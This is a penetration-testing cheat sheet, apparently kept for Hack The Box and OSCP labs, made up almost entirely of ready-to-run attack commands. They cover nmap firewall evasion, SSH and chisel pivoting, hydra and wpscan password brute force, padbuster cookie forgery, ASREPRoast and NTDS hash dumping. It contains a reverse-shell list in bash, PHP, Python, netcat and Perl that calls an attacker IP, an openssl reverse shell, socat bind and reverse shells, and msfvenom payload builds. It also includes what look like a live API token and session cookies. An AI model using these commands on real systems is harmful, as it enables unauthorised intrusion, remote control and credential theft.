## run if port 53 open on target host
```bash
dnsenum hostname.htb # will try zone transfer, brute subs
dnsrecon hostname.htb
```
## nmap evade filtering
```bash
# spoof source port
nmap --source-port 80 ...
# spoof source ip
nmap -S ip_address ...
# spoof mac address
nmap --spoof-mac mac_address ...
# send ACK packets to detect if there's a firewall in place
nmap -sA ...
# use tiny fragmented IP packets 
nmap -f ...
# set Maximum Transmission Unit to create packets of (8/16/24/32/64 byte size
nmap --mtu 24 ...
# send random number of decoy packets during scan
nmap -D RND:10 ...
# append random data in packets to change packet size
nmap --data-length 1337 ...

```

## SSH Tunneling 101
```bash
# SSH local port forward to reach  an_internal_server_ip:port via server_ip
ssh tunneler@server_ip -p 2222 -L 1234:an_internal_server_ip:80 
# Now curl localhost:1234 will fetch an_internal_server_ip:80 which is reachable from server_ip only

# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip
ssh tunneler@server_ip -p 2222 -D 1080 
# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from server_ip only

# ProxyJump ssh to an_internal_host via ssh server_ip
ssh -J tunneler@server_ip:2222 whistler@an_internal_host # which is only accessible from server_ip

# SSH remote port forward to send traffic back to our local port from a port of server_ip
ssh whistler@server_ip -p 2222 -L 58671:localhost:1234 # 
# this will listen on port 58671 of server_ip and tunnel the traffic back to us on loclahost:1234; nc -nlvp 1234 to receive for example

# Chain ProxyJump + dynamic port forward to create a proxy of 2nd_box which is only accessible via 1st_box
ssh -j firstuser@1st_box:2222 seconduser@2nd_box -D 1080
# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only

# bypass first time prompt when have non-interactive shell

ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ...

```

## SSH reverse tunneling
```bash
ssh -f -N -R 8000:10.3.3.14:80 -R 4443:10.3.3.14:443 -R 33306:10.3.3.14:3306 -R 33389:10.3.3.14:3389  -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i key kali@192.168.19.57

# kill with
ps -C ssh
kill -9 <pid>
```

## Chisel [Github]

```bash
# on my kali [192.168.19.57 for ex]
./chisel_1.7.0_linux_amd64 server -p 8000 --reverse
# on the server I can reach [10.11.1.251 for ex]
./chisel_1.7.0_linux_386 client 192.168.19.57:8000 R:80:10.3.3.14:80
# in above the 10.3.3.14 is the one I can't reach directly from kali
```


## Socat basics
```bash
----
# socat connect
socat TCP4:10.1.1.1 443 # nc 10.1.1.1 443

# socat listen
sudo socat TCP4-LISTEN:443 STDOUT # nc -nlvp 443

----

# socat listen and send file on connect 
sudo socat TCP4-LISTEN:443,fork file:dump.txt # nc -nlvp 443 < dump.txt

# socat connect and receive file
socat TCP4:10.1.1.1:443 file:dump.txt,create # nc 10.1.1.1 443 > dump.txt

----

# socat listen for reverse shell 
socat -d -d TCP4-LISTEN:443 STDOUT # -d for verbose, nc -nlvp 443

# socat send reverse shell
socat TCP4:10.1.1.1:443 EXEC:/bin/bash

----

# socat encrypted ssl listener with self signed cert
sudo socat OPENSSL-LISTEN:443,cert=my_cert.pem,verify=0,fork EXEC:/bin/bash # this is to bind shell

# socat connect to ssl listener
socat - OPENSSL:10.1.1.1:443,verify=0

----

# socat encrypted ssl listener with self signed cert
sudo socat OPENSSL-LISTEN:443,cert=my_cert.pem,verify=0,fork STDOUT # this is reverse shell listener

# socat connect to ssl listener and send rev shell
socat - OPENSSL:10.1.1.1:443,verify=0 EXEC:'cmd.exe',pipes

```



## Scan open ports using Socat
```bash
for i in `seq 1 65535`; do socat - TCP:server_ip:$i ; done 2>/dev/null
```

## translate TCP traffic to UDP using Socat
```bash
socat -v TCP-LISTEN:13337,fork UDP:server_ip:161
#listens on local port 13337 for a TCP packet, translates it to UDP packet and forwards it to server_ip:port
```

## Tunnel UDP packet to an_internal_box via a SSH tunnel  (local UDP > TCP -> pivot -> TCP > UDP -> target UDP)
```bash
mkfifo /tmp/fifo; sudo nc -l -u -p 161 < /tmp/fifo | nc localhost 1234 > /tmp/fifo 
# nc listens on local UDP port 161, wraps UDP traffic to TCP, forwards TCP packet to local port 1234  
ssh user@server_ip -L 1234:servers_internal_ip:13337
# ssh through server_ip and forward traffic from port 1234 of our local box to port 13337 of server's internal_ip
socat -v TCP-LISTEN:13337,fork UDP:an_internal_box:161 # run it from 2nd box
#listens on local port 13337 for a TCP packet, translates it to UDP packet and forwards it to an_internal_box:port

# now for example running snmpwalk against localhost will probe an_internal_box's 161 box
snmpwalk -v2c -c public 127.0.0.1
# snmp is a udp-based protocol and since ssh tunnel is TCP based we did the above process first 
```

## create self-signed ssl certificate
```bash
openssl req -newkey rsa:2048 -nodes -keyout my_cert.key -x509 -days 36
2 -out my_cert.crt

# convert to .pem if needed:
openssl pkcs12 -export -in my_cert.crt -inkey my_cert.key -out my_cert.p12
openssl pkcs12 -in my_cert.p12 -nodes -out my_cert.pem
```

## searchsploit
```bash
searchsploit -www query # show exploitdb link instead
searchsploit -x /path/to/exploit # read the exploit file
searchsploit -m /path/to/exploit # mirror exploit file to current directory
```
## oscp friendly rev shell aspx
```bash
msfvenom -f exe -p windows/shell_reverse_tcp LHOST=10.10.14.27 LPORT=443 -e x86/shikata_ga_nai -o rev.exe
oscp friendly exe
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=9001 -o nasa.aspx 
```
## hydra web form bruteforce
```bash
hydra -l admin -P ~/git/SecLists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"

hydra -l admin -P ~/git/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password" -t 64 # 64 threads
# change to https-web-form for port 443
```
## hydra ssh brute
```bash
hydra -l username -P wordlist.txt ssh <Target-IP> -s 22222
```

## get glibc version
```bash
ldd --version
```
## compile for 32 bit from a 64bit os, install `gcc-multilib` first
```bash
gcc -m32 -D_GNU_SOURCE -o suid32 suid.c
```
## transfer files through netcat
```bash
# start listening for download
nc -nlvp 9001 > dump.txt
# start uploading from target box
nc ip port < file.txt

```

## forward a remote port to local machine using chisel
```bash
./chisel_1.6.0_linux_amd64 server -p 9000 --reverse # from local machine
./chisel_1.6.0_linux_amd64 client LOCAL_MACHINE_IP:9000 R:5432:localhost:5432 # from target box, forward port 5432
```

## bypass restricted shell on ssh login :
```bash
ssh mindy@10.10.10.51 -t "bash --noprofile" 
```
## bruteforce zip file with fcrackzip
```bash
fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip 
```
## bruteforce zip file with john
```bash
zip2john myfile.zip > johnkey
john johnkey --wordlist=/usr/share/wordlists/rockyou.txt
```

## port knocking on 3 ports using nmap
```bash
for x in $(echo 22 23 24);do nmap -PN --host-timeout 201 --max-retries 0 -r -p$x 192.168.0.106;done
```

## classic gobuster
```bash
gobuster dir -u http://10.10.10.55:8080 -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -o gobuster/http-dlist-lower-small.txt
```

## list contents of .vhd file
```bash
7z l filename.vhd
```


## do a local port scan using SSRF
```bash
# --hl=2 is hide responses that has 2 lines. 
wfuzz -c --hl=2 -z range,1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ
```

## dump password hasshes from ntds dump file using system hive file and the dit file
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM.bin LOCAL
# tip: users ending with $ are system accounts and has hard passwords, look for other ones
```
## wpscan enum all plugins 
```bash
wpscan --url http://10.10.10.88/webservices/wp/ --enumerate ap --plugins-detection aggressive --force --api-token o3Oj8OysJNmHbVf5PoEMe6ASLUrac3Q5KJB8G0aguz4
```

## wpscan brute
```bash
wpscan --usernames tom -P /usr/share/wordlists/rockyou.txt --force --password-attack wp-login --url http://192.168.137.131/prehistoricforest/ --no-update
```

## generate client certificate from ca.key
```bash
openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out rh.pem
openssl pkcs12 -export -in rh.pem -inkey ca.key -out rh.p12
```

## login via ssh and use tcpdump to monitor loopback interface of traffic in a port (i.e: 389/ldap) | pipe to wireshark to monitor it live
```bash
# only works if the ssh user has sufficient permissions or the tcpdump binary has posix capability set
ssh username@10.10.10.119 "/usr/sbin/tcpdump -i lo -U -s0 -W - 'port 389'" | wireshark -k -i -
```

## openssl reverse shell 
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s
```

## generate passwd hash with openssl
```sh
openssl passwd -1 -salt rh0x01 password123
```

## check ASREPRoast for all domain users (without credentials)
```bash
for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
```

## john crack krb5asrep hash
```bash
john --format:krb5asrep alfresco.kerb --wordlist=/usr/share/wordlists/rockyou.txt
```

## decrypt cookie with padbuster
```bash
padbuster http://docker.hackthebox.eu:30956/profile.php fpHSDPAvUpGGyRtXuqOS9DsQupZ6mbO1f0oD5/p7XWTfEMhtyCj0rg== 8 --cookie "iknowmag1k=fpHSDPAvUpGGyRtXuqOS9DsQupZ6mbO1f0oD5/p7XWTfEMhtyCj0rg==;PHPSESSID=o376o30lb3aieccf3gi6uj4247"

```
## encrypt cookie with padbuster
```bash
padbuster http://docker.hackthebox.eu:30956/profile.php fpHSDPAvUpGGyRtXuqOS9DsQupZ6mbO1f0oD5/p7XWTfEMhtyCj0rg== 8 --cookie "iknowmag1k=fpHSDPAvUpGGyRtXuqOS9DsQupZ6mbO1f0oD5/p7XWTfEMhtyCj0rg==;PHPSESSID=o376o30lb3aieccf3gi6uj4247" -plaintext '{"user":"a1a1","role":"admin"}'
```

## generate password wordlist with crunch
```bash
crunch 13 13 -t bev,%%@@^1995 -o wordlist.txt
# 13 13 - min max length
# bev - start's with
# @ will insert lower case characters
# , will insert upper case characters
# % will insert numbers
# ^ will insert symbols
```


## mount nfs share
```bash
mount -t nfs -o vers=3 10.1.1.1:/home/ ~/home


mount -t nfs4 -o proto=tcp,port=2049 127.0.0.1:/srv/Share mountpoint
```

## mount smb share
```sh
sudo mount -t cifs //10.1.1.1/'sharename' /home -o rw,vers=1.0,dir_mode=0777,file_mode=0777,nounix
# or
sudo mount -t cifs -o vers=1.0 //10.11.1.136/'Sharename' sharemount
```

## login to windows machine in the network with proxychains

```bash
xfreerdp /u:admin /v:ip_address +clipboard
```

## find suid,sgid binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

## find files based on group

```sh
find / -group adm ! -type d -exec ls -la {} \; 2>/dev/null
```

## rev shells

```sh
Bash	bash -i >& /dev/tcp/192.168.19.57/4444 0>&1
PHP	php -r '$sock=fsockopen("192.168.19.57",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
Python	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.19.57",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
NCv1	nc -e /bin/sh 192.168.19.57 4444
NCv2	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.19.57 4444 >/tmp/f
Perl	perl -e 'use Socket;$i="192.168.19.57";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Make the shell interactive by executing below commands:

```sh
python -c'import pty;pty.spawn("/bin/bash")'
[ctrl+z]
stty raw -echo
fg
export TERM=xterm-256color
export SHELL=bash
stty rows 26 columns 238
```